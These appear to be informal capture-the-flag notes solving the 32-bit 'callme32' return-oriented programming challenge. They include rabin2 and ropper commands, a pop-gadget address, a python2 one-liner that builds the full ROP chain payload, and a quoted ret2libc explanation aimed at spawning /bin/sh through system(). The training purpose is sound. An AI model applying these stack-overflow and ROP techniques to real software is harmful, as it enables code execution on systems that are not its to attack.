check the stings  in binary : rabin2 -z callme32

the issue is since this is 32 bit binary and the function will be reading parameters off the stack, once we reach the second function call, the stack is not going to be the same, so what we need to do is find a gadget that will pop the values off the stack after each function call so that we can repeat the process again. Since each fuction takes 3 values, we need to find a gadget that will pop 3 values off the stack

ropper --file callme32 --search "pop"

0x080487f9: pop esi; pop edi; pop ebp; ret;

python2 -c "print 'A'*44 + '\xf0\x84\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0' + '\x50\x85\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0' + '\xe0\x84\x04\x08' + '\xf9\x87\x04\x08' + '\xef\xbe\xad\xde' + '\xbe\xba\xfe\xca' + '\x0d\xf0\x0d\xd0'"  > payload

add the pop_gadget after every function call 
./callme32 < payload

If we only needed to call one of these functions, our exploit payload would look something like this:
"A" * 40 => buffer
Address1 => callme_one()
Address2 => dummy return value
Integer1 => 0x00000001
Integer2 => 0x00000002
Integer3 => 0x00000003

However, since we need to call callme_two() right afterward, we can’t just put it’s address in the spot of Address2 because that is going to need it’s own saved return value, which is where Integer1 currently sits.

------------------------------------------------------------------
| buffer fill-up(*)| function_in_lib | dummy_int32 | arg_1 | arg_2 | ... 
------------------------------------------------------------------
                          ^
                          |
                          - this int32 should overwrite saved return address 
                            of a vulnerable function

(*) buffer fill-up should overwrite saved %ebp placeholder as well, if the
    latter is used

  When the function containing the overflown buffer returns, the 
execution will resume at function_in_lib, which should be the address of a 
library function. From this function's point of view, dummy_int32 will be the 
return address, and arg_1, arg_2 and the following words - the arguments. 
Typically, function_in_lib will be the libc system() function address, and 
arg_1 will point to "/bin/sh".

